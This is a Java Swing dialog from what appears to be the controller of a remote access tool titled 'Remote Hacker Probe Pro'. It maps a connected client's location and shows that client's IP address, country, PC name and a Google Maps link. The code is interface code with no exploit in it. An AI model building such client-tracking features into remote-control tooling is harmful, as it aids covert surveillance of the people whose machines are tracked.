package rhp;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.FlowLayout;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.event.MouseInputListener;

import org.jxmapviewer.JXMapViewer;
import org.jxmapviewer.OSMTileFactoryInfo;
import org.jxmapviewer.input.CenterMapListener;
import org.jxmapviewer.input.PanKeyListener;
import org.jxmapviewer.input.PanMouseInputListener;
import org.jxmapviewer.input.ZoomMouseWheelListenerCenter;
import org.jxmapviewer.viewer.DefaultTileFactory;
import org.jxmapviewer.viewer.GeoPosition;
import org.jxmapviewer.viewer.TileFactoryInfo;
import org.jxmapviewer.viewer.WaypointPainter;

import javax.swing.JTextPane;
import java.awt.Font;
import java.awt.event.ActionListener;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.awt.event.ActionEvent;
import javax.swing.JLabel;
import javax.swing.JComboBox;
import javax.swing.JTextField;

class ComboItem
{
    private String key;
    private String value;

    public ComboItem(String key)
    {
        this.key = key;
        this.value = value;
    }

    @Override
    public String toString()
    {
        return key;
    }

    public String getKey()
    {
        return key;
    }

    public String getValue()
    {
        return value;
    }
}

public class Map extends JDialog {

	public static int CLIENT_ID;
	private final JPanel contentPanel = new JPanel();
	int zoomsize = 2;
	JLabel lc = new JLabel("Location");
	JLabel gmlbl = new JLabel("Google Maps : ");
	final JXMapViewer mapViewer = new JXMapViewer();
	Double lat = MainWindow.GetLatitude(CLIENT_ID);
    Double longi = MainWindow.GetLongitude(CLIENT_ID);
    private JTextField gm;
    Boolean isProbe;
	/**
	 * Create the dialog.
	 */
	
	public void UpdateMapInfo()
	{
		int mode = -1;
		lc.setText("IP Address : " + Server.WANIP.get(CLIENT_ID) + " Country : " + Server.ReturnLocation(mode, isProbe));
		gm.setText("https://www.google.com/maps?q=" + String.valueOf(lat) + "," + String.valueOf(longi));
		GeoPosition posi = new GeoPosition(lat, longi);
        mapViewer.setAddressLocation(posi);
		
	}
	public Map() {
		setResizable(false);
		setTitle("Remote Hacker Probe Pro | GeoLocation");
		setBounds(100, 100, 526, 366);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(null);
		
		JPanel panel = new JPanel();
		panel.setBounds(10, 61, 499, 255);
		contentPanel.add(panel);
		panel.setLayout(null);
		
		

        // Create a TileFactoryInfo for OpenStreetMap
        TileFactoryInfo info = new OSMTileFactoryInfo();
        DefaultTileFactory tileFactory = new DefaultTileFactory(info);
        mapViewer.setTileFactory(tileFactory);

        // Use 8 threads in parallel to load the tiles
        tileFactory.setThreadPoolSize(8);

        // Set the focus
        GeoPosition posi = new GeoPosition(lat, longi);
        mapViewer.setZoom(zoomsize);
        mapViewer.setAddressLocation(posi);
        // Display the viewer in a JFrame
        panel.add(mapViewer);
        mapViewer.setLayout(null);
        mapViewer.setBounds(0, 0, 499, 255);
        
        MouseInputListener mia = new PanMouseInputListener(mapViewer);
        mapViewer.addMouseListener(mia);
        mapViewer.addMouseMotionListener(mia);
        mapViewer.addMouseListener(new CenterMapListener(mapViewer));
        mapViewer.addMouseWheelListener(new ZoomMouseWheelListenerCenter(mapViewer));
        mapViewer.addKeyListener(new PanKeyListener(mapViewer));
        
        Set<MyWaypoint> waypoints = new HashSet<MyWaypoint>(Arrays.asList(
                new MyWaypoint(Server.UserPC.get(CLIENT_ID), Color.RED, posi)));

        // Create a waypoint painter that takes all the waypoints
        WaypointPainter<MyWaypoint> waypointPainter = new WaypointPainter<MyWaypoint>();
        waypointPainter.setWaypoints(waypoints);
        waypointPainter.setRenderer(new FancyWaypointRenderer());

        mapViewer.setOverlayPainter(waypointPainter);
        
        JButton zoomin = new JButton("+");
        zoomin.setToolTipText("Zoom in");
        zoomin.addActionListener(new ActionListener() {
        	public void actionPerformed(ActionEvent e) {
        		zoomsize--;
        		mapViewer.setZoom(zoomsize);
        	}
        });
        zoomin.setFont(new Font("Calibri", Font.BOLD, 12));
        zoomin.setBounds(408, 34, 41, 23);
        contentPanel.add(zoomin);
        
        JButton zoomout = new JButton("-");
        zoomout.setToolTipText("Zoom out");
        zoomout.addActionListener(new ActionListener() {
        	public void actionPerformed(ActionEvent e) {
        		zoomsize++;
        		mapViewer.setZoom(zoomsize);
        	}
        });
        zoomout.setFont(new Font("Calibri", Font.BOLD, 12));
        zoomout.setBounds(459, 34, 41, 23);
        contentPanel.add(zoomout);
        
        
        lc.setFont(new Font("Calibri", Font.PLAIN, 12));
        lc.setBounds(10, 11, 490, 14);
        contentPanel.add(lc);
          
        gmlbl.setFont(new Font("Calibri", Font.PLAIN, 12));
        gmlbl.setBounds(10, 38, 86, 14);
        contentPanel.add(gmlbl);
        
        
        gm = new JTextField();
        gm.setToolTipText("This url can be used to viewt the Clients location in Google maps.");
        gm.setFont(new Font("Consolas", Font.BOLD, 11));
        gm.setBounds(92, 35, 302, 20);
        contentPanel.add(gm);
        gm.setColumns(10);
	}
}
